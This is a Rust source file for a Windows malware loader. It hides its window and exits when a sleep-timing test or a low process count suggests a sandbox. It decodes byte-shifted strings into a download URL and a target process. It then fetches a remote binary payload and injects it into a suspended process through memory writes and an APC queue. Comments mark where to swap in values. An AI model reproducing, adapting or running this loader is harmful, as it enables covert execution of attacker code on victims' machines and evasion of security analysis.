#![windows_subsystem = "windows"]

use std::io::Read;
use ureq;
use sysinfo::{System, SystemExt};
use std::mem::{transmute, zeroed};

use std::ptr::{null, null_mut};
use windows_sys::Win32::Foundation::{CloseHandle, TRUE};
use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows_sys::Win32::System::Memory::{VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE};
use windows_sys::Win32::System::Threading::{CreateProcessA, QueueUserAPC, ResumeThread, CREATE_NO_WINDOW, CREATE_SUSPENDED, PROCESS_INFORMATION, STARTF_USESTDHANDLES, STARTUPINFOA};

pub fn ft() {
    use std::time::{Duration, Instant};
    use std::thread::sleep;

    let start_time = Instant::now();

    sleep(Duration::from_millis(5000));

    let elapsed_time = start_time.elapsed();

    if elapsed_time.as_millis() < 5000 {
        std::process::exit(1);
    }
}

pub fn pc() {
    let mut system = System::new_all();
    system.refresh_all();
    let process_count = system.processes().len();

    if process_count <= 50 {
        std::process::exit(1);
    }
}


fn main() {
    ft();
    pc();
    // 按需
    let p = ds(&[71, 62, 96, 123, 109, 114, 104, 115, 123, 119, 96, 119, 125, 119, 120, 105, 113, 55, 54, 96, 114, 115, 120, 105, 116, 101, 104, 50, 105, 124, 105, 4]);

    // 替换处
    let up = ds(&[108, 120, 120, 116]);
    let uh = ds(&[53, 61, 54, 50, 53, 58, 60, 50, 53, 55, 52, 50, 53]);
    let upo = ds(&[61, 61, 61, 61]);
    let upa = ds(&[51, 103, 101, 112, 103, 50, 102, 109, 114]);
    //

    let dup = String::from_utf8_lossy(&up);
    let duh = String::from_utf8_lossy(&uh);
    let d_upo = String::from_utf8_lossy(&upo);
    let d_upa = String::from_utf8_lossy(&upa);

    g(&format!("{}://{}:{}/{}", dup, duh, d_upo, d_upa), p);
}

fn g(u: &str, p: Vec<u8>) {
    let resp = ureq::get(u).call().expect("Failed to get response");
    if resp.status() != 200 {
        std::process::exit(1);
    } else {
        let mut data = Vec::new();
        resp.into_reader().read_to_end(&mut data).expect("Failed to read response body");
        i(&data, data.len(), p);
    }
}

fn i(s: &[u8], ss: usize, p: Vec<u8>) {
    unsafe {
        let mut pi: PROCESS_INFORMATION = zeroed();
        let mut si: STARTUPINFOA = zeroed();
        si.dwFlags = STARTF_USESTDHANDLES | CREATE_SUSPENDED;
        si.wShowWindow = 0;

        CreateProcessA(
          p.as_ptr(),
          null_mut(),
          null(),
          null(),
          TRUE,
          CREATE_NO_WINDOW,
          null(),
          null(),
          &si,
          &mut pi,
        );

        let addr = VirtualAllocEx(
            pi.hProcess,
            null(),
            ss,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if addr.is_null() {
            std::process::exit(1);
        }

        WriteProcessMemory(
            pi.hProcess,
            addr,
            s.as_ptr().cast(),
            ss,
            null_mut(),
        );


        let mut old = PAGE_READWRITE;
        VirtualProtectEx(
            pi.hProcess,
            addr,
            ss,
            PAGE_EXECUTE_READ,
            &mut old,
        );

        let func = transmute(addr);
        QueueUserAPC(Some(func), pi.hThread, 0);
        ResumeThread(pi.hThread);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

fn ds(encoded: &[u8]) -> Vec<u8> {
    encoded.iter().map(|&byte| byte - 4).collect()
}
